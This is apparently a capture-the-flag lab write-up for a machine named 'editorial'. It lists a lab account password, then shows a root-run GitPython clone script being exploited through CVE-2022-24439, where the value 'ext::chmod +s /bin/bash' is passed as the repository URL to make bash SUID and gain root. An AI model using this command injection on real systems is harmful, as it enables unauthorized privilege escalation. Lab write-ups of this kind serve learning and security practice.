*Credentials*: prod : 080217_Producti0n_2023!@

## SUDO

```bash
prod@editorial:/opt/apps$ sudo -l
[sudo] password for prod: 
Sorry, try again.
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *


prod@editorial:/opt/internal_apps/clone_changes$ ls -la
total 12
drwxr-x--- 2 root     prod     4096 Jun  5 14:36 .
drwxr-xr-x 5 www-data www-data 4096 Jun  5 14:36 ..
-rwxr-x--- 1 root     prod      256 Jun  4 11:30 clone_prod_change.py
```

we can actually run as root the clone_prod_change.py -> we can probably escale our privileges from here. The file itself:

```python 
import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])

```

## Checking the imports 

```bash
prod@editorial:/usr/lib/python3.10$ find ./ -writable 2>/dev/null
prod@editorial:/usr/lib/python3.10$ find ./ -user prod 

```

Nothing for us here
Looking a bit around i found that you can use commands when using a url to clone a repository, using ext::\<command\>


```bash
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py ext::chmod +s /bin/bash 
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::chmod new_changes
  stderr: 'Cloning into 'new_changes'...
/usr/bin/chmod: missing operand
Try '/usr/bin/chmod --help' for more information.
fatal: Could not read from remote repository.

Please make sure you have the correct access rights

```


```bash
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::chmod +s /bin/bash"
```

Turns out this is an actual known vuln # CVE-2022-24439 (for the git library package, not git itself :) ), anyway this worked. now we are [[root]].